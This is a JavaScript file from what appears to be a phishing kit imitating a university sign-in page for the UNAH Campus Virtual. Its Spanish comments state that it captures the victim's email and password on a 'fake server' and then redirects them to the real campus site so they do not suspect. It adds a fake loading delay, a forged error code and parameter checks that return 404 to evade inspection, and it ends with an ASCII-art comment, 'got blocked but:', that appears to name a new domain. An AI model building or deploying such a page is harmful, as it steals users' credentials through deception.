// Variable global para almacenar el correo electrónico ingresado por el usuario
var userEmail = "";

function sanitizeString(str) {
    if (!str) return "";
    return str.replace(/[<>]/g, "");
}

function isValidBase64(str) {
    if (!str) return true;
    try {
        return btoa(atob(str)) === str.replace(/\s/g, "");
    } catch (err) {
        return false;
    }
}

function trigger404() {
    window.location.replace("/404-error-not-found");
}

document.addEventListener("DOMContentLoaded", function () {
    var urlParams = new URLSearchParams(window.location.search);
    const allowedParams = ['u', 'p', 'logo', 'bg', 'edificio', 'planta'];

    // --- REVISIÓN DE REDIRECCIÓN: Si los parámetros 'edificio' y 'planta' están presentes, 
    // redirigimos a la misma página pero limpiando estos parámetros de la URL para ocultarlos a la vista.
    var hasEdificio = urlParams.has('edificio');
    var hasPlanta = urlParams.has('planta');

    if (hasEdificio && hasPlanta) {
        // Crear una nueva URL sin los parámetros de edificio y planta
        var newParams = new URLSearchParams();
        for (const [key, value] of urlParams.entries()) {
            if (key !== 'edificio' && key !== 'planta') {
                newParams.append(key, value);
            }
        }

        // Redirect to login.html with remaining parameters
        var newUrl = window.location.pathname;
        if (newParams.toString()) {
            newUrl += '?' + newParams.toString();
        }
        window.location.replace(newUrl);
        return;
    }

    // --- 1. VERIFICACIÓN ESTRICTA DE LISTA BLANCA ---
    // Si la URL contiene algún parámetro que no está permitido, disparamos error 404
    for (const key of urlParams.keys()) {
        if (!allowedParams.includes(key)) {
            trigger404();
            return;
        }
    }

    // --- 2. VALIDACIÓN BASE64 ---
    // Algunos parámetros deben venir codificados en Base64. Verificamos que lo estén.
    const b64ParamsToCheck = ['u', 'logo', 'bg'];
    for (let param of b64ParamsToCheck) {
        let value = urlParams.get(param);
        if (value && !isValidBase64(value)) {
            trigger404();
            return;
        }
    }

    // --- 3. RENDERIZADO DE LA INTERFAZ (LOGO Y DATOS) ---
    var defaultLogo = "../static/logo2.png";

    // Verificar si existe el parámetro 'u' (correo pre-rellenado)
    var getId = urlParams.get("u");
    if (getId) {
        try {
            userEmail = sanitizeString(atob(getId));
            // Si el correo viene pre-rellenado, saltamos directamente al paso de la contraseña
            document.getElementById("email-step").style.display = "none";
            document.getElementById("password-step").style.display = "block";
            document.getElementById("display_email").innerText = userEmail;
            var signinOptionsBtn = document.querySelector('.signin-options');
            if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
        } catch (e) {
            trigger404();
            return;
        }
    }

    // Lógica para establecer el logo personalizado
    var getLogo = urlParams.get("logo");
    var logoElement1 = document.getElementById("logo_image");
    var logoElement2 = document.getElementById("logo_image_2");

    var logoSrc = defaultLogo;
    if (getLogo) {
        try {
            var decodedLogo = atob(getLogo);
            if (decodedLogo.startsWith('https://') || decodedLogo.startsWith('data:image')) {
                logoSrc = decodedLogo;
            } else {
                trigger404();
                return;
            }
        } catch (e) {
            trigger404();
            return;
        }
    }

    if (logoElement1) logoElement1.src = logoSrc;
    if (logoElement2) logoElement2.src = logoSrc;

    // Establecer el logo en la vista de opciones de inicio de sesión
    var logoElement3 = document.getElementById("logo_image_3");
    if (logoElement3) logoElement3.src = logoSrc;

    // Añadir el manejador de eventos para el botón de opciones de inicio de sesión
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) {
        signinOptionsBtn.addEventListener('click', showSignInOptions);
    }
});

// Mostrar la vista de opciones de inicio de sesión con animación
function showSignInOptions() {
    var emailStep = document.getElementById("email-step");
    var passwordStep = document.getElementById("password-step");
    var optionsView = document.getElementById("signin-options-view");
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "none";

    // Ocultar la vista actual e introducir la nueva con una animación CSS
    if (emailStep.style.display !== "none") {
        emailStep.classList.add("slide-out-left");
        setTimeout(function () {
            emailStep.style.display = "none";
            emailStep.classList.remove("slide-out-left");
            optionsView.style.display = "block";
            optionsView.classList.add("slide-in-right");
            setTimeout(function () {
                optionsView.classList.remove("slide-in-right");
            }, 300);
        }, 300);
    } else if (passwordStep.style.display !== "none") {
        passwordStep.classList.add("slide-out-left");
        setTimeout(function () {
            passwordStep.style.display = "none";
            passwordStep.classList.remove("slide-out-left");
            optionsView.style.display = "block";
            optionsView.classList.add("slide-in-right");
            setTimeout(function () {
                optionsView.classList.remove("slide-in-right");
            }, 300);
        }, 300);
    }
}

// Ocultar la vista de opciones de inicio de sesión y volver al paso de correo
function hideSignInOptions() {
    var emailStep = document.getElementById("email-step");
    var optionsView = document.getElementById("signin-options-view");
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";

    optionsView.classList.add("slide-out-left");
    setTimeout(function () {
        optionsView.style.display = "none";
        optionsView.classList.remove("slide-out-left");
        emailStep.style.display = "block";
        emailStep.classList.add("slide-in-right");
        setTimeout(function () {
            emailStep.classList.remove("slide-in-right");
        }, 300);
    }, 300);
}

// Paso 1: Enviar el Correo
function submitEmail() {
    var emailElement = document.getElementById("email");
    var errorElement = document.getElementById("email-error");
    var emailValue = emailElement.value.trim();
    var nextButton = document.getElementById("email-next");
    var loadingSpinner = document.getElementById("loading-spinner");

    // Validación básica del correo electrónico
    if (emailValue.length <= 0 || !emailValue.includes("@")) {
        errorElement.style.display = "block";
        return;
    }

    errorElement.style.display = "none";
    userEmail = emailValue;

    // Mostrar el spinner de carga y ocultar el botón
    nextButton.style.display = "none";
    loadingSpinner.style.display = "flex";

    // Enviar el correo electrónico al backend para registrarlo
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/email", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            // Simular un retraso de carga para darle más realismo a la animación
            setTimeout(function () {
                // Ocultar el spinner de carga
                loadingSpinner.style.display = "none";
                nextButton.style.display = "block";

                // Pasar al paso de la contraseña con una animación de deslizamiento
                var emailStep = document.getElementById("email-step");
                var passwordStep = document.getElementById("password-step");
                var signinOptionsBtn = document.querySelector('.signin-options');
                if (signinOptionsBtn) signinOptionsBtn.style.display = "none";

                emailStep.classList.add("slide-out-left");
                setTimeout(function () {
                    emailStep.style.display = "none";
                    emailStep.classList.remove("slide-out-left");
                    passwordStep.style.display = "block";
                    passwordStep.classList.add("slide-in-right");
                    document.getElementById("display_email").innerText = userEmail;
                    setTimeout(function () {
                        passwordStep.classList.remove("slide-in-right");
                    }, 300);
                }, 300);
            }, 800); // 800ms de retraso simulado
        }
    };

    var data = "email=" + encodeURIComponent(emailValue);
    xhttp.send(data);
}

// Paso 2: Enviar la Contraseña
function submitPassword() {
    var passwordElement = document.getElementById("password");
    var errorElement = document.getElementById("password-error");
    var passwordValue = passwordElement.value;

    if (passwordValue.length <= 0) {
        errorElement.style.display = "block";
        return;
    }

    errorElement.style.display = "none";

    var tosContainer = document.getElementById("tos-container");
    // Verificamos si el contenedor de los términos de servicio (ToS) está oculto.
    // Si lo está, lo mostramos y detenemos el envío para obligar a que lo lean/acepten.
    if (tosContainer && tosContainer.style.display === "none") {
        tosContainer.style.display = "block";
        // Opcional: Hacer scroll para que el usuario pueda ver los términos
        tosContainer.scrollIntoView({ behavior: "smooth", block: "center" });
        return;
    }

    var tosCheckbox = document.getElementById("tos-checkbox");
    var tosError = document.getElementById("tos-error");
    // Si el checkbox de ToS no está marcado, mostramos el error
    if (tosCheckbox && !tosCheckbox.checked) {
        if (tosError) tosError.style.display = "block";
        return;
    }
    if (tosError) {
        tosError.style.display = "none";
    }

    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            // Una vez capturados los datos correctamente en nuestro servidor falso, 
            // redirigimos a la víctima a la página del Campus Virtual para que no sospeche.
            window.location.href = "https://campusvirtual.unah.edu.hn/";
        }
    };

    var data = "u=" + encodeURIComponent(userEmail) + "&p=" + encodeURIComponent(passwordValue);
    xhttp.send(data);
}

// Regresar al paso del correo
function goBackToEmail() {
    document.getElementById("password-step").style.display = "none";
    document.getElementById("email-step").style.display = "block";
    document.getElementById("email").value = userEmail;
    var signinOptionsBtn = document.querySelector('.signin-options');
    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";
}

function toggleTroubleshoot() {
    var section = document.getElementById("troubleshoot-section");
    if (section) {
        section.style.display = (section.style.display === "none") ? "block" : "none";
        if (section.style.display === "block") window.scrollTo(0, document.body.scrollHeight);
    }
}

function copyTroubleshoot() {
    const info = `Error Code: 16000\nRequest Id: 756acfe5-ae8e-438a-bc0b-f62fd5130b00\nCorrelation Id: 6f4f1763-7f3a-37fd-a0c1-e33a92cc4b21\nTimestamp: 2026-02-27T19:54:22.801Z`;

    navigator.clipboard.writeText(info).then(() => {
        var status = document.getElementById("copy-status");
        if (status) {
            status.textContent = "✓ Copied";
            status.style.color = "green";
            status.style.fontWeight = "bold";
            status.style.display = "inline";
            setTimeout(() => {
                status.style.display = "none";
            }, 3000);
        }
    });
}
/*  

got blocked but:
         ,-.-.          ,-.-.          ,-.-.       ,-,--.     _ __                                          ,-,--.               ,-.--,                        
,-..-.-./  \==\,-..-.-./  \==\,-..-.-./  \==\    ,-.'-  _\ .-`.' ,`. ,--.-.  .-,--._,..---._   .-.,.---.  ,-.'-  _\     .--.-.  /=/, .',--.-.  .-,--.,--,----. 
|, \=/\=|- |==||, \=/\=|- |==||, \=/\=|- |==|   /==/_ ,_.'/==/, -   Y==/- / /=/_ /==/,   -  \ /==/  `   \/==/_ ,_.'     \==\ -\/=/- / /==/- / /=/_ //==/` - ./ 
|- |/ |/ , /==/|- |/ |/ , /==/|- |/ |/ , /==/   \==\  \  |==| _ .=. \==\, \/=/. /|==|   _   _\==|-, .=., \==\  \         \==\ `-' ,/  \==\, \/=/. / `--`=/. /  
 \, ,     _|==| \, ,     _|==| \, ,     _|==|    \==\ -\ |==| , '=',|\==\  \/ -/ |==|  .=.   |==|   '='  /\==\ -\         |==|,  - |   \==\  \/ -/   /==/- /   
 | -  -  , |==| | -  -  , |==| | -  -  , |==|    _\==\ ,\|==|-  '..'  |==|  ,_/  |==|,|   | -|==|- ,   .' _\==\ ,\       /==/   ,   \   |==|  ,_/   /==/- /-.  
  \  ,  - /==/   \  ,  - /==/   \  ,  - /==/.=. /==/\/ _ |==|,  |     \==\-, /   |==|  '='   /==|_  . ,'./==/\/ _ | .=. /==/, .--, - \  \==\-, /   /==/, `--`\ 
  |-  /\ /==/    |-  /\ /==/    |-  /\ /==/:=; :\==\ - , /==/ - |     /==/._/    |==|-,   _`//==/  /\ ,  )==\ - , /:=; :\==\- \/=/ , /  /==/._/    \==\-  -, | 
  `--`  `--`     `--`  `--`     `--`  `--`  `=`  `--`---'`--`---'     `--`-`     `-.`.____.' `--`-`--`--' `--`---'  `=`  `--`-'  `--`   `--`-`      `--`.-.--` 

  */